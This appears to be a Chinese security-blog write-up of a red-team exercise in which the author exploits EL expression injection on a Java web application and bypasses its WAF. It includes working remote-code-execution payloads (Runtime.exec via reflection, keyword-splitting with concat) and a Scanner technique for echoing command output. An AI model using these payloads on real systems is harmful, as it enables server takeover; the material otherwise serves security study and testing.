# 记一次HVV实战中对EL表达式的极限绕过-先知社区

> **来源**: https://xz.aliyun.com/news/19070  
> **文章ID**: 19070

---

## 前言

在这次HVV的时候发现了一些表达式漏洞，但是发现都有 waf，waf 啊 waf，一绕就是一下午，真的燃尽了，下面是绕过的详细记录，这次看的案列是 EL 表达式，下面记录自己当时从0到1 的一个绕过过程和复盘记录

## EL 表达式

### EL 语法

所有EL表达式的格式都是以 ${} 表示

### [ ]与.运算符

EL表达式提供 . 和 [] 两种运算符来存取数据。

当要存取的属性名称中包含一些特殊字符，如 . 或 - 等并非字母或数字的符号，就一定要使用 []。例如：${user.My-Name} 应当改为 ${user["My-Name"]}。

如果要动态取值时，就可以用 [] 来做，而 . 无法做到动态取值。例如：${sessionScope.user[data]} 中 data 是一个变量。

### 隐式对象

JSP 表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：

|  |  |
| --- | --- |
| 术语 | 定义 |
| pageContext | JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，${pageContext.response} 为页面的响应对象赋值。 |

此外，还提供几个隐式对象，允许对以下对象进行简易访问：

|  |  |
| --- | --- |
| 术语 | 定义 |
| param | 将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式 ${param . name} 相当于 request.getParameter (name)。 |
| paramValues | 将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 ${paramvalues. name} 相当于 request.getParamterValues(name)。 |
| header | 将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 ${header. name} 相当于 request.getHeader(name)。 |
| headerValues | 将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式 ${headerValues. name} 相当于 request.getHeaderValues(name)。 |
| cookie | 将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式 ${cookie. name .value} 返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用 ${headerValues. name} 表达式。 |
| initParam | 将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。 |

除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：

|  |  |
| --- | --- |
| 术语 | 定义 |
| pageScope | 将页面范围的变量名称映射到其值。例如，EL 表达式可以使用 ${pageScope.objectName} 访问一个 JSP 中页面范围的对象，还可以使用 ${pageScope .objectName. attributeName} 访问对象的属性。 |
| requestScope | 将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用 ${requestScope. objectName} 访问一个 JSP 请求范围的对象，还可以使用 ${requestScope. objectName. attributeName} 访问对象的属性。 |
| sessionScope | 将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：${sessionScope. name} |
| applicationScope | 将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。 |

首先这次基础知识得知道，常用的命令执行的 paylaod

对象如何获取？

**Scope 对象**

Scope 对象用来访问不同作用域（如请求域、会话域、应用域）中存储的属性。比如通过 request.setAttribute("name", "bearbar") 存入的值，可以用 ${requestScope.name} 方式获取，就像访问对象的属性一样。  
**param 和 paramValues 对象**

param 和 paramValues 对象用来获取请求参数。param 对应 request.getParameter，返回单个字符串值；paramValues 对应 request.getParameterValues，返回字符串数组。比如请求参数 username=bearbar，使用 ![](images/20250929150055-0b8a890c-9d02-1.svg){paramValues.username} 则获得数组。

**header 和 headerValues 对象**

header 和 headerValues 对象用来访问 HTTP 请求头。header 相当于 request.getHeader，返回单个请求头的值；headerValues 相当于 request.getHeaders，返回请求头的所有值。举例，要获取 user-agent 请求头，可以用 ![](images/20250929150056-0bb677a8-9d02-1.svg){header["user-agent"]}。这两种写法都能正确访问请求头信息。

## 常见 RCE payload

```
//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
${pageContext}

//获取Web路径
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}

//文件头参数
${header}

//获取webRoot
${applicationScope}

//执行命令
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

## 极限绕过

我找到这样一个接口，就是你发什么，就给你回显什么

![图片.png](images/img_19070_002.png)

我第一反应就是测试 xss，当然，hvv 中 xss 没有什么作用，不过对各种漏洞场景习惯了

![](images/20250929150057-0c574728-9d02-1.png)

wc，当时没有想到会有过滤，但是看到接口和参数的名称，又觉得没有那么简单，猜到应该和计算器差不多

输入 1+1

![](images/20250929150057-0cd1aa9a-9d02-1.png)

但是没有计算结果，可能是+号的问题，使用减法吧

![](images/20250929150058-0d5b6bd8-9d02-1.png)

到这里我就很疑惑了，这是为什么??

就去搞其他站了，过了不知道多久，其他站进展也很小，当时就又回来干，然后反应过来，这里很可能是输入的表达式，因为是 java 的站点，先尝试了 el 表达式

![](images/20250929150059-0ddbd2da-9d02-1.png)

谁懂这种感觉，说明执行成功了，shell 终于要到手了

于是兴高彩烈去网上找了一手 payload

![](images/20250929150100-0e5ca858-9d02-1.png)

wc 了，竟然有 waf，那为什么 script 都禁用我，慢慢来

![](images/20250929150101-0eda02f6-9d02-1.png)

不是这是什么鬼啊，内置对象都要拦截，那我还怎么表达式注入啊??

把所有的内置对象都尝试了一遍，结果都是一样的，都被拦截了

于是开始了尝试，一步一步来，首先我们肯定是需要获取类的

![](images/20250929150102-0f4f48e8-9d02-1.png)

首先获取到类，然后 class.forname 获取到我们的任意类

```
number=${''.getClass().forName('java.lang.Runtime')}
```

![](images/20250929150102-0fa4588a-9d02-1.png)

大小写绕过等手法都不行

折磨了有一会，想着不用 Runtime

参考<https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#0x06-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84-EXP-%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%BB%95%E8%BF%87>

![](images/20250929150103-10285a7a-9d02-1.png)

我以为有救了的时候

![](images/20250929150104-10872028-9d02-1.png)

完蛋被诈骗了，我想着不管怎么说还是得绕过啊，其他类我看了

![](images/20250929150104-11051822-9d02-1.png)

网上有的方法都被禁用了

最后读了文档发现了可以这样

![](images/20250929150105-117fdda8-9d02-1.png)

怎么说呢，就是[]和点的作用相同，你会说，不还是获取到了 class 吗，有啥区别，你别急，看着

![](images/20250929150106-120628d8-9d02-1.png)

你看看这是啥，不就是我需要的关键类吗，然后就是不断利用这个手法，去绕过我们的关键字

但是当我准备实例化这个类的时候，我又懵了

![](images/20250929150107-128ac552-9d02-1.png)

为什么报错是

java.lang.Class.getRuntime()

从 Class 类去找 getRuntime 这个方法，我前面不是 Runtime 这个类吗

如果你再看一遍 payload，你就懂了

```
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

这里是需要去 getMethod 的，然后 invoke 调用

![](images/20250929150108-13204b7a-9d02-1.png)

有点麻木了，可能参数传入有问题

![](images/20250929150109-139ab9e8-9d02-1.png)

使用它给的 payload

```
${''.getClass()
['forName']('java.lang.Run'.concat('time'))
['getMethod']('get'.concat('Runtime'), [].getClass().getComponentType())
['invoke'](null)}
```

改一下

![](images/20250929150110-1425e69e-9d02-1.png)

被诈骗了，结果最后只需要把 null 删除就好了

![](images/20250929150111-14ad1aba-9d02-1.png)

不容易啊，终于得到了这个实例化对象，开始执行命令

![](images/20250929150112-155dde2c-9d02-1.png)

但是可惜，没有结果，于是我又开始寻找起了回显的方法

刚好奇安信社区就有

<https://forum.butian.net/share/886>

研究了一会，感觉弄得有点复杂了，我们本地弄一下

这里我们使用一个类

Scanner

![](images/20250929150113-15e2a738-9d02-1.png)

它的实例化方法接受一个输入流

我们就设定为我们的执行结果，然后如何读取呢

看下面的代码就明白了

```
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

public class Test {
    public static void main(String[] args) throws IOException {
        Process p = Runtime.getRuntime().exec("whoami");
        InputStream is = p.getInputStream();
        Scanner scanner = new Scanner(is).useDelimiter("\A");
        String output = scanner.hasNext() ? scanner.next() : "";
        System.out.println(output);

    }
}
```

于是我们找猫画虎写到 el 表达式中

![](images/20250929150114-169b8db6-9d02-1.png)

哎，真的不容易啊

## 总结

真的就是一步一步，一步一步的遇到一个障碍就绕过一个障碍，这种绕过的感觉太爽了，爽死了，以前是学过 EL 表达式的，不过都忘得差不多了，这次是真把 EL 表达式又学了一遍，其实如果有内置对象可能会方面很多，不过没有无伤大雅
